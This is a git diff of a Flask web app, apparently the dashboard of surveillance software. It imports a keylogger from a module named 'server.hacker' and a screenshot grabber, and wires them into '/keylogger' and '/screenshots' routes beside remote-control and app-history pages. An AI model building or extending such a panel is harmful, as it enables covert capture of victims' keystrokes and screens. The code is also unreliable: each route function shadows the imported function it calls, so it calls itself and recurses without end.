@@ -1,6 +1,8 @@
 from flask import Flask, request, render_template
 import sqlite3
 import os
+from server.hacker import keylogger
+from server.receiveImageScreen import screenshots
 
 app = Flask(__name__)  # Specify the template folder explicitly
 
@@ -33,18 +35,24 @@ def login():
 
 @app.route('/keylogger')
 def keylogger():
-    # Xử lý logic cho chức năng "Giám sát bàn phím" ở đây
-    return render_template('keylogger.html')  
+    dataTest= keylogger()
+    return render_template('keylogger.html', dataTest=dataTest)  
 
 @app.route('/screenshots')
 def screenshots():
-    # Xử lý logic cho chức năng "Giám sát bàn phím" ở đây
-    return render_template('screenshots.html')  
+    dataTest= screenshots()
+    return render_template('screenshots.html', dataTest=dataTest)  
 
 @app.route('/remote-control')
 def remoteControl():
     # Xử lý logic cho chức năng "Giám sát bàn phím" ở đây
     return render_template('remote-control.html')  
+
+@app.route('/app-history')
+def appHistory():
+    # Xử lý logic cho chức năng "Giám sát bàn phím" ở đây
+    return render_template('app-history.html')  
+
 
 @app.route('/statistics')
 def statistics():
